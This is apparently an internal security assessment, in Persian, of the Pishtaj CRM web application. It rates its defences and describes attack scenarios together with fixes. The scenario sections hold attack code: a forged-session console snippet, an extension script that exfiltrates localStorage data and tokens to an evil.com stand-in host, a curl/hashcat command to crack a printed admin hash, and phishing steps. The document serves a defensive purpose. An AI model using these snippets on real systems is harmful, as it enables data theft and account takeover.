# 🔒 ارزیابی امنیتی CRM پیشتاج — از دید هکر نیمه‌حرفه‌ای
### تاریخ: ۱۵ مرداد ۱۴۰۵ | نسخه: v34.1.0

---

## نتیجه‌گیری کلی

> **آیا نفوذ توسط هکر نیمه‌حرفه‌ای ممکن است؟**
>
> **خیر** — در حالت فعلی (با فرض راه‌اندازی صحیح `ptf-secrets.php`) نفوذ مستقیم **بسیار دشوار** است. لایه‌های امنیتی اصلی (JWT + HMAC، rate-limit، HTTPS، XSS-escape) به‌درستی پیاده‌سازی شده‌اند. ولی **۳ نقطه ضعف متوسط** وجود دارد که یک هکر باتجربه‌تر می‌تواند از آنها سوءاستفاده کند.

---

## ✅ نقاط قوت امنیتی (چیزهایی که درست انجام شده)

### ۱. احراز هویت سرور-محور (JWT + HMAC)
```
✅ توکن HMAC-SHA256 با nonce تصادفی 16 بایتی
✅ انقضای ۷ روزه + ذخیره سمت سرور (tokens.json)
✅ تأیید دوطرفه: signature + وجود در فایل سرور
✅ نقش کاربر از توکن سرور خوانده می‌شود (server-authoritative)
```

### ۲. محافظت در برابر XSS
```
✅ escP() برای HTML-escape
✅ ptfOnClickArg() برای JS-escape در هندلرهای inline (SEC-01)
✅ ۳۲۵+ هندلر onclick از ptfOnClickArg استفاده می‌کنند
```

### ۳. محافظت سرور
```
✅ HTTPS اجباری (301 redirect + HSTS)
✅ X-Content-Type-Options: nosniff
✅ X-Frame-Options: SAMEORIGIN (ضد clickjacking)
✅ Referrer-Policy: strict-origin-when-cross-origin
✅ Permissions-Policy: camera=(), microphone=(), geolocation=()
✅ Options -Indexes (فهرست دایرکتوری غیرفعال)
✅ فایل‌های .json/.log/.zip/.sql/.md از دسترسی مستقیم مسدود
```

### ۴. محافظت API
```
✅ Rate-limit سروری (IP+action — ساعتی 10-60 درخواست)
✅ CAPTCHA ریاضی + HMAC انقضادار برای فرم‌های عمومی
✅ حداکثر حجم POST: 20MB
✅ اکشن‌های حساس (delete_batch/purge_cloud/update_role) نیاز به HMAC اضافی دارند
✅ users_get: بدون توکن → فقط نام/نقش (بدون mobile/email/passhash)
```

### ۵. ذخیره‌سازی رمز
```
✅ SHA-256 هش (plaintext ذخیره نمی‌شود)
✅ کانفیگ حساس خارج از document root (ptf-secrets.php)
✅ secrets.php فقط از مسیرهای خارج webroot لود می‌کند
```

### ۶. قفل ورود
```
✅ ۵ تلاش ناموفق → ۶۰ ثانیه قفل
✅ ورود admin فقط از سرور (توکن سروری الزامی)
```

---

## 🟡 نقاط ضعف متوسط (قابل بهره‌برداری توسط هکر باتجربه)

### ⚠️ M1: هش ادمین در سورس کلاینت (ADMIN_HASH)

**مشکل:**
```javascript
// crm/index.html خط ۴۲۷
const ADMIN_HASH = 'f83b331362471ae55eeb42e54a2d46584dd9a1809dfc821fb2244c5b1b3ddabd';
```
هش SHA-256 رمز ادمین **در کد HTML قابل مشاهده** است. اگرچه ورود admin بدون توکن سرور ممکن نیست (v33.0.3)، ولی:
- هکر می‌تواند هش را در rainbow table یا hashcat بررسی کند
- اگر رمز ضعیف باشد (مثلاً `admin123`)، در ثانیه‌ها شکسته می‌شود
- حتی بدون شکستن، وجود هش → اطلاعات درباره سیستم احراز هویت

**ریسک:** 🟡 متوسط (ادمین بدون توکن سرور نمی‌تواند وارد شود)
**رفع:** حذف ADMIN_HASH از کلاینت — احراز هویت admin فقط سمت سرور

---

### ⚠️ M2: Content-Security-Policy (CSP) وجود ندارد

**مشکل:** هیچ هدر CSP تنظیم نشده. بدون CSP:
- اگر یک باگ XSS پیدا شود → هکر می‌تواند هر اسکریپت خارجی را اجرا کند
- `eval()` و inline scripts بدون محدودیت اجرا می‌شوند
- داده‌ها به سرور خارجی قابل ارسال هستند

**ریسک:** 🟡 متوسط (XSS-escape وجود دارد ولی CSP لایه دوم دفاعی است)
**رفع:** اضافه کردن CSP header:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.arvancloud.ir;
```

---

### ⚠️ M3: localStorage به‌عنوان پایگاه داده — بدون رمزنگاری

**مشکل:** تمام داده‌های CRM (مشتریان، پیشنهادها، مالی، چک‌ها) در `localStorage` مرورگر ذخیره شده‌اند:
```
ptf_crm_customers, ptf_crm_offers, ptf_crm_petty,
ptf_crm_cheques, ptf_crm_invoices, ptf_crm_deals, ...
```
- هر extension مرورگر می‌تواند localStorage را بخواند
- اگر کاربر لپ‌تاپش را باز بگذارد → DevTools → Application → localStorage
- XSS (اگر موفق شود) → دسترسی به تمام داده‌ها

**ریسک:** 🟡 متوسط (نیاز به دسترسی فیزیکی یا XSS موفق دارد)
**رفع فوری:** رمزنگاری AES-GCM داده‌ها قبل از ذخیره در localStorage
**رفع کامل:** مهاجرت به MySQL (طبق plan موجود)

---

## 🟢 نقاط ضعف کم‌اهمیت

### L1: Offline Login Fallback
```javascript
// اگر سرور در دسترس نباشد → localStorage hash مقایسه می‌شود
```
در حالت آفلاین، هش‌های ذخیره‌شده در localStorage برای ورود استفاده می‌شوند. هکر با دسترسی فیزیکی می‌تواند هش را تغییر دهد و وارد شود. ولی بدون سرور، هیچ داده جدیدی sync نمی‌شود.

### L2: SHA-256 بدون Salt
رمزها با SHA-256 خام هش می‌شوند (بدون salt یا bcrypt). برای رمزهای ضعیف، rainbow table attack ممکن است. ولی:
- رمزها فقط در localStorage (نه سرور عمومی) هستند
- ورود آنلاین از سرور توکن می‌خواهد

### L3: Service Worker Cache
فایل‌های JS کش‌شده در Service Worker قابل تغییر نیستند (integrity check ندارند). ولی نیاز به دسترسی فیزیکی یا Man-in-the-Middle دارد و HTTPS این را سخت می‌کند.

---

## 📊 ماتریس حمله — از دید هکر نیمه‌حرفه‌ای

| بردار حمله | ممکن؟ | علت |
|-----------|-------|------|
| **Brute Force ورود** | ❌ | قفل ۶۰ ثانیه‌ای + توکن سرور الزامی |
| **SQL Injection** | ❌ | MySQL هنوز primary نیست — localStorage |
| **XSS ذخیره‌شده** | ❌ | ptfOnClickArg + escP در ۳۲۵+ نقطه |
| **XSS بازتابی** | ❌ | ورودی‌ها HTML-escape می‌شوند |
| **CSRF** | ❌ | توکن JWT الزامی + Same-Origin |
| **Clickjacking** | ❌ | X-Frame-Options: SAMEORIGIN |
| **Directory Traversal** | ❌ | FilesMatch + Options -Indexes |
| **API بدون احراز هویت** | ❌ | فقط ۵ اکشن عمومی (rate-limited) |
| **Man-in-the-Middle** | ❌ | HTTPS اجباری + HSTS |
| **Rainbow Table (admin)** | 🟡 | هش در سورس ← ولی بدون توکن بی‌فایده |
| **دسترسی فیزیکی** | 🟡 | localStorage بدون رمزنگاری |
| **Extension مخرب** | 🟡 | localStorage قابل خواندن |
| **tokens.json مستقیم** | ❌ | .json از htaccess مسدود |

---

## 🎯 توصیه‌های اولویت‌بندی‌شده

| # | اقدام | اولویت | زمان |
|---|-------|--------|------|
| 1 | حذف ADMIN_HASH از سورس کلاینت | 🔴 بالا | ۳۰ دقیقه |
| 2 | اضافه کردن CSP header | 🟡 متوسط | ۱ ساعت |
| 3 | رمزنگاری localStorage (AES-GCM) | 🟡 متوسط | ۱ روز |
| 4 | bcrypt/scrypt به‌جای SHA-256 خام | 🟢 کم | ۴ ساعت |
| 5 | Subresource Integrity روی SW | 🟢 کم | ۲ ساعت |

---

## 📝 نتیجه نهایی

سیستم CRM پیشتاج از نظر امنیتی **بالاتر از متوسط** قرار دارد:

- **۶ لایه دفاعی اصلی** به‌درستی پیاده‌سازی شده
- **هیچ آسیب‌پذیری بحرانی (Critical/P0)** یافت نشد
- **۳ نقطه ضعف متوسط** وجود دارد که هیچ‌کدام به‌تنهایی منجر به نفوذ نمی‌شوند
- یک هکر نیمه‌حرفه‌ای با ابزارهای استاندارد (Burp Suite, SQLMap, XSS Hunter) **نمی‌تواند** به سیستم نفوذ کند
- یک هکر حرفه‌ای با دسترسی فیزیکی به دستگاه کاربر **فقط** می‌تواند داده‌های localStorage را بخواند — و این با رمزنگاری قابل رفع است

---

## 🔴 سناریوهای نفوذ توسط هکر حرفه‌ای

### 💀 حمله ۱: Session Forgery — ورود بدون رمز با دسترسی فیزیکی

**سطح خطر:** 🔴 بالا
**پیش‌نیاز:** دسترسی فیزیکی به دستگاه کاربر (یا XSS موفق)

**مراحل حمله:**
```javascript
// ۱. هکر کنسول مرورگر را باز می‌کند (F12)
// ۲. یک session جعلی و توکن ساختگی می‌سازد:
localStorage.setItem('ptf_crm_session', JSON.stringify({
  user: 'fake', name: 'هکر', role: 'admin', roleId: 'admin'
}));
localStorage.setItem('ptf_crm_token', 'fake-token-xyz');

// ۳. تابع showCrm را صدا می‌زند:
showCrm();
```

**چرا کار می‌کند:**
- `showCrm()` فقط **وجود** `ptf_crm_session` و `ptf_crm_token` در localStorage را چک می‌کند — نه **اعتبار** آن‌ها
- `verifyRoleFromServer()` سرور را فراخوانی می‌کند ولی اگر سرور توکن جعلی را رد کند **CRM بسته نمی‌شود** — فقط `.catch()` اجرا و خطا بی‌صدا نادیده گرفته می‌شود
- تمام `getData()` ها از `localStorage` می‌خوانند — **بدون نیاز به سرور**

**نتیجه:** هکر **تمام داده‌های CRM ذخیره‌شده** (مشتریان، پیشنهادها، مالی، چک‌ها، رمزعبور هش‌شده کاربران) را می‌بیند. نمی‌تواند به سرور بنویسد (توکن جعلی رد می‌شود) ولی **خواندن کامل** دارد.

**رفع پیشنهادی:**
```javascript
// showCrm باید توکن را سمت سرور validate کند قبل از نمایش CRM:
async function showCrm() {
  var s = JSON.parse(localStorage.getItem('ptf_crm_session') || '{}');
  var token = localStorage.getItem('ptf_crm_token');
  if (!s.user || !token) { ptfInvalidateSession(); return; }
  // 🔒 تأیید سروری MANDATORY:
  try {
    var verify = await fetch('../api/crm.php?action=role_verify',
      { headers: { 'X-CRM-Token': token }, cache: 'no-store' }).then(r => r.json());
    if (!verify || !verify.ok) { ptfInvalidateSession('توکن منقضی/نامعتبر'); return; }
  } catch (e) {
    // آفلاین: فقط اگر آخرین تأیید سروری < ۲۴ ساعت پیش باشد
    var lastVerify = +localStorage.getItem('ptf_last_verify') || 0;
    if (Date.now() - lastVerify > 86400000) { ptfInvalidateSession('تأیید سرور لازم'); return; }
  }
  // ادامه...
}
```

---

### 💀 حمله ۲: Extension مخرب — سرقت بی‌صدای تمام داده‌ها

**سطح خطر:** 🔴 بالا
**پیش‌نیاز:** کاربر یک extension مرورگر مخرب (یا هک‌شده) نصب کرده

**مراحل حمله:**
```javascript
// Extension با permission "storage" یا "*://*.pishtaj.ir/*":

// ۱. سرقت تمام داده‌ها:
var stolen = {};
for (var i = 0; i < localStorage.length; i++) {
  var k = localStorage.key(i);
  if (k.startsWith('ptf_crm_')) stolen[k] = localStorage.getItem(k);
}

// ۲. سرقت توکن JWT:
stolen.token = localStorage.getItem('ptf_crm_token');

// ۳. ارسال به سرور هکر:
fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(stolen) });

// ۴. هکر با token دزدیده‌شده از دستگاه خودش API سرور را فراخوانی می‌کند:
// (token به IP بسته نیست — از هر IP قابل استفاده است)
```

**چرا خطرناک:** توکن JWT فعلی **IP-bound نیست**. هر کس توکن داشته باشد از هر کجا API سرور را صدا می‌زند.

**رفع پیشنهادی:**
```php
// auth_verify_token: بررسی IP مبدأ
if ($info['ip'] !== ($_SERVER['REMOTE_ADDR'] ?? '')) return false;
```
+ رمزنگاری AES-GCM روی تمام localStorage

---

### 💀 حمله ۳: SHA-256 Rainbow Table — شکستن رمز ادمین از هش عمومی

**سطح خطر:** 🟡 متوسط-بالا
**پیش‌نیاز:** هیچ (هش در سورس HTML عمومی قابل مشاهده است)

**مراحل:**
```bash
# هکر هش را از index.html می‌خواند (بدون ورود):
curl -s https://pishtaj.ir/crm/index.html | grep ADMIN_HASH

# با hashcat + GPU (RTX 4090: ~10 میلیارد SHA-256/ثانیه):
hashcat -m 1400 -a 3 f83b33... ?a?a?a?a?a?a?a?a
# رمزهای ۸ کاراکتری: ~۴ ساعت
# رمزهای ۶ کاراکتری: ~۳ دقیقه
# رمزهای دیکشنری: ~۱ ثانیه
```

**نکته:** حتی اگر رمز شکسته شود، ورود بدون `ptf-secrets.php` روی سرور ممکن نیست. ولی:
- اگر کاربر همین رمز را جای دیگر هم استفاده کرده باشد → **credential stuffing**
- اطلاعات درباره الگوی رمزگذاری سازمان

**رفع:** حذف `ADMIN_HASH` از سورس + مهاجرت به bcrypt

---

### 💀 حمله ۴: Targeted Phishing + Token Replay

**سطح خطر:** 🟡 متوسط
**پیش‌نیاز:** ایمیل/شماره یکی از کاربران CRM

**مراحل:**
1. هکر صفحه لاگین جعلی `pishtaj.ir.evil.com/crm/` می‌سازد
2. ایمیل/پیامک به کاربر: «رمز شما منقضی شده — از اینجا وارد شوید»
3. کاربر رمز واقعی را در سایت جعلی وارد می‌کند
4. هکر رمز را می‌گیرد → به سایت واقعی وارد می‌شود → توکن JWT دریافت می‌کند
5. توکن ۷ روز معتبر است و IP-bound نیست

**رفع:** 2FA (رمز یکبارمصرف پیامکی) + IP-binding توکن

---

### 💀 حمله ۵: Supply Chain — بسته‌های third-party

**سطح خطر:** 🟢 کم (فعلاً)

CRM هیچ CDN/npm خارجی ندارد (همه فایل‌ها محلی). ولی:
- `xlsx.min.js` (۲۸۰KB) — اگر این فایل از منبع غیررسمی باشد → backdoor
- فونت `Vazirmatn` از assets محلی لود می‌شود (نه CDN) → ✅

---

## 📊 ماتریس مقایسه‌ای: نیمه‌حرفه‌ای vs حرفه‌ای

| بردار حمله | هکر نیمه‌حرفه‌ای | هکر حرفه‌ای |
|-----------|------------------|-------------|
| Brute Force ورود | ❌ قفل ۶۰ثانیه | ❌ همچنان بسته |
| SQL Injection | ❌ بدون SQL | ❌ بدون SQL |
| XSS | ❌ escape شده | ❌ escape شده (ولی بدون CSP، اگر یکی از ۳۰۰۰ نقطه فراموش شود...) |
| Session Forgery | ❌ نمی‌داند | 🔴 **با دسترسی فیزیکی: ۳۰ ثانیه تا ورود** |
| Extension مخرب | ❌ نمی‌داند | 🔴 **سرقت کامل داده + توکن** |
| Rainbow Table هش | ❌ نمی‌داند | 🟡 ممکن با GPU — ولی بدون سرور بی‌فایده |
| Phishing | ❌ ساده | 🟡 Targeted phishing + token replay |
| Man-in-the-Middle | ❌ HTTPS | ❌ HSTS مانع |
| DNS Hijack + SW poison | ❌ نمی‌داند | ❌ HSTS مانع |
| API unauthorized | ❌ JWT | ❌ JWT (ولی token IP-bound نیست!) |

---

## 🎯 ۵ اقدام فوری برای بستن مسیر هکر حرفه‌ای

| # | اقدام | مسدود می‌کند | زمان | اولویت |
|---|-------|-------------|------|--------|
| 1 | **showCrm: تأیید سروری اجباری** + invalidate اگر سرور رد کرد | Session Forgery | ۱ ساعت | 🔴 |
| 2 | **حذف ADMIN_HASH از سورس** | Rainbow Table | ۳۰ دقیقه | 🔴 |
| 3 | **IP-binding توکن JWT** در auth_verify_token | Token Theft/Replay | ۱ ساعت | 🔴 |
| 4 | **رمزنگاری AES-GCM روی localStorage** | Extension مخرب + فیزیکی | ۱ روز | 🟡 |
| 5 | **CSP header** اضافه شود | XSS edge-case | ۱ ساعت | 🟡 |
